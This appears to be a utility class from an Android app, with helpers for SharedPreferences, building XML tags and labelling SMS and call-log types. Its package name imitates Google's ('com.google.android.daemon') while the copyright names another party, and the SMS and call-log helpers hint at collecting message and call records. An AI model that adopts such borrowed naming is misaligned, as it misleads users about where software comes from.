/**
 * @(#) Util.java Created on 2013-1-19
 *
 * Copyright (c) 2013 com.braver. All Rights Reserved
 */
package com.google.android.daemon;

import android.content.Context;
import android.content.SharedPreferences;
import android.provider.CallLog.Calls;

/**
 * The class <code>Util</code>
 * 
 * @author ouyangfeng
 * @version 1.0
 */
public final class Util {

    /**
     * get SharedPreferences
     * 
     * @param mContext
     * @return SharedPreferences
     */
    public final static SharedPreferences getSP(Context mContext) {
        return mContext.getSharedPreferences(Const.SP_NAME, Context.MODE_PRIVATE);
    }

    /**
     * get SharedPreferences string
     * 
     * @param mContext
     * @param key
     * @return
     */
    public final static String getSpStr(Context mContext, String key) {
        return getSP(mContext).getString(key, null);
    }

    /**
     * create xml
     * 
     * <pre>
     * <name>value</name>
     * </pre>
     * 
     * @param name
     * @param value
     * @param isTab
     * @return
     */
    public static String builderXmlTAG(String name, String value, boolean isTab) {
        final StringBuffer buffer = new StringBuffer();
        buffer.append(builderXmlOneTAG(name, isTab, false, false));
        buffer.append(value);
        buffer.append(builderXmlOneTAG(name, false, true, true));
        return buffer.toString();

    }

    /**
     * 
     * @param name
     * @param isTab
     * @param isEnd
     * @param isLn
     * @return
     */
    public static String builderXmlOneTAG(String name, boolean isTab, boolean isEnd, boolean isLn) {
        final StringBuffer buffer = new StringBuffer();
        if (isTab) {
            buffer.append(Const.TAG_TAB_START);
        } else {
            buffer.append(Const.TAG_START);
        }
        if (isEnd) {
            buffer.append("/");
        }
        buffer.append(name);
        if (isLn) {
            buffer.append(Const.TAG_END_LN);
        } else {
            buffer.append(Const.TAG_END);
        }

        return buffer.toString();
    }

    /**
     * get sms type
     * 
     * @param type
     * @return
     */
    public static final String getSMSType(int type) {
        if (type == 1) {
            return "Receiver";
        } else if (type == 2) {
            return "Send";
        } else {
            return "Unknown";
        }
    }

    public static String getCallLogType(int type) {
        switch (type) {
        case 1:
            return "INCOMING_TYPE";
        case 2:
            return "OUTGOING_TYPE";
        case 3:
            return "MISSED_TYPE";

        default:
            return "Unknown";
        }
    }

}
